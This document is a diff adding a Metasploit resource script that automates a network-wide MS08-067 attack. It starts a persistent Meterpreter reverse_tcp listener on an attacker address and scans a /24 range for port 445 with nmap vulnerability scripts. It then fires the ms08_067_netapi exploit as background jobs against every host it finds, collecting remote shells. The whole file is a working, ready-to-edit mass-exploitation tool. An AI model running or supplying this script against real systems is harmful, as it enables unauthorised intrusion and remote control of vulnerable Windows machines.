@@ -1,0 +1,54 @@
+# NetApi ms08_067 Quick & Dirty Network Attack
+#
+<ruby>
+############# EDIT THIS ###########
+targetz = '10.10.20.0-255'       ##
+lhostz  = '10.10.5.112'          ##
+###################################
+
+print_status("Running NetApi Network Autopwn....")
+
+#Create new workspace and destroy if it already exists
+pwn='netapi_pwn'
+workspace = framework.db.find_workspace(pwn)
+if workspace != nil  
+	workspace.destroy  
+	workspace = framework.db.add_workspace(pwn)  
+	print_status("Creating New Workspace: #{pwn}")
+else  
+	workspace = framework.db.add_workspace(pwn)  
+end
+#jump into our new workspace
+run_single("workspace #{pwn}")
+
+#Setup Persistent Listener to Catch All the Shells we can throw at it
+print_status("Setting up Permanent Listener.....")  
+print_status("Payload: windows/meterpreter/reverse_tcp")
+print_status("Listner Port: 6969")
+
+run_single("use exploit/multi/handler")
+run_single("setg payload windows/meterpreter/reverse_tcp")
+run_single("set LPORT 6969")
+run_single("setg LHOST #{lhostz}")
+run_single("set ExitOnSession false")
+run_single("exploit -j -z")
+
+#Scan with db_nmap to store results in MSF database
+print_status("Running NMAP Discovery Scan on #{targetz}.....")  
+run_single("db_nmap -A -PN -p 445 --script=smb-check-vulns #{targetz}")
+
+#Search results and find potential targets to run netapi attack against
+print_status("Sorting NMAP results into potential targets list.....")  
+targets=[]
+framework.db.services.each { |db_services| if (db_services.port == 445) and (db_services.name == "microsoft-ds") then framework.db.hosts.each { |ip| if ip.id == db_services.host.id then targets << ip['address'] end } end }
+print_status("Potential Targets: #{targets.size}")  
+
+#Enumerate list of potentials and run exploit
+run_single("use exploit/windows/smb/ms08_067_netapi")
+run_single("set DisablePayloadHandler true")
+targets.each do |host|
+	print_status("Running Exploit as Job Against: #{host}")
+	run_single("set RHOST #{host}")
+	run_single("exploit -j -z")
+end
+</ruby>
